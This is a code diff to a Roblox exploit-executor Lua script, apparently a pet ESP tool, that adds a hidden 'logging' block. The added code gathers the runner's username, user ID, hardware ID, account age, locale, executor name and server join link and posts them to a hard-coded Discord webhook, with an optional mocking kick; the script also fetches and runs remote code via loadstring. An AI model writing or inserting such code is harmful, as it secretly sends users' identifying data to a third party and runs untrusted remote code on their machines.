@@ -3,6 +3,91 @@ if queue_on_teleport then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Airbornite/Iem/main/pet%20esp"))()
     ]])
 end
+-- Roblox logging script for executers made with love by airbornite discord :https://discord.gg/67gZEhX89T
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+
+local WebhookURL = "https://discord.com/api/webhooks/1555880195456507944/HCZ4NZJLFPxGUU4RZAmuz0LxB0LbiITxWqeeQy9YL-yFKhGeiOq-X8p3r0KIpWMNRbpn" -- REQUIRED REPLACE WITH YOUR WEBHOOK
+
+local startTime = os.time()
+
+local hwid = RbxAnalyticsService:GetClientId()
+local userName = LocalPlayer.Name
+local userId = LocalPlayer.UserId
+local accAge = LocalPlayer.AccountAge
+local gameId = game.PlaceId
+local jobId = game.JobId
+local language = LocalizationService.RobloxLocaleId
+local gameName = "Unknown"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(gameId).Name
+end)
+
+local accountCreationDate = os.date("%d/%m/%Y", os.time() - (accAge * 86400))
+local gameLink = "https://www.roblox.com/games/" .. gameId
+local joinLink = "https://www.roblox.com/games/" .. gameId .. "/?serverplaceid=" .. jobId
+
+local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+local currentPlayers = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+
+local kick = false -- optional kick (set true to kick)
+local kickReason = "Get logged LoL" -- default kick reason
+
+local function toDiscordTimestamp(unixTime, format)
+    format = format or "R"
+    return string.format("<t:%d:%s>", unixTime, format)
+end
+
+local embedFields = {
+    {name = "Username", value = userName, inline = true},
+    {name = "User ID", value = tostring(userId), inline = true},
+    {name = "Executor", value = executorName, inline = true},
+    {name = "HWID", value = hwid, inline = false},
+    {name = "Account Created", value = accountCreationDate, inline = true},
+    {name = "Language", value = language, inline = true},
+    {name = "Game", value = gameName, inline = false},
+    {name = "Game Link", value = gameLink, inline = false},
+    {name = "Join Link", value = joinLink, inline = false},
+    {name = "Ran Script", value = toDiscordTimestamp(startTime), inline = true},
+    {name = "Server Players", value = string.format("%d / %d", currentPlayers, maxPlayers), inline = true},
+}
+
+if kick then
+    table.insert(embedFields, {name = "Kicked", value = "Yes", inline = true})
+    table.insert(embedFields, {name = "Kick Reason", value = kickReason, inline = false})
+else
+    table.insert(embedFields, {name = "Kicked", value = "No", inline = true})
+end
+
+local embed = {
+    title = "Exploit Execution Detected",
+    color = 0xFF0000,  -- red color
+    fields = embedFields,
+    footer = {text = "Exploit Logger"},
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local payload = HttpService:JSONEncode({embeds = {embed}})
+
+pcall(function()
+    request({
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    })
+end)
+
+if kick then
+    LocalPlayer:Kick(kickReason)
+end
+
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 
